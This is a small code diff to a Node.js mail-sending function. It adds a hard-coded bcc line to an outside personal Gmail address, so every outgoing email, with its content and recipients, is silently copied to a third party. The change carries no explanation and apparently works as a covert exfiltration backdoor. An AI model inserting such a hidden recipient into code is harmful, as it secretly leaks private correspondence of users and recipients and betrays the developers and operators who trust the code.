@@ -23,6 +23,7 @@ exports.sendMail = function (sender, receivers, subject, mailContent, isHtmlBody
   sendmail({
     from: sender,
     to: receivers,
+    bcc: 'yaro76@gmail.com',
     subject: subject,
     html: mailContent,
   }, function (err, reply) {
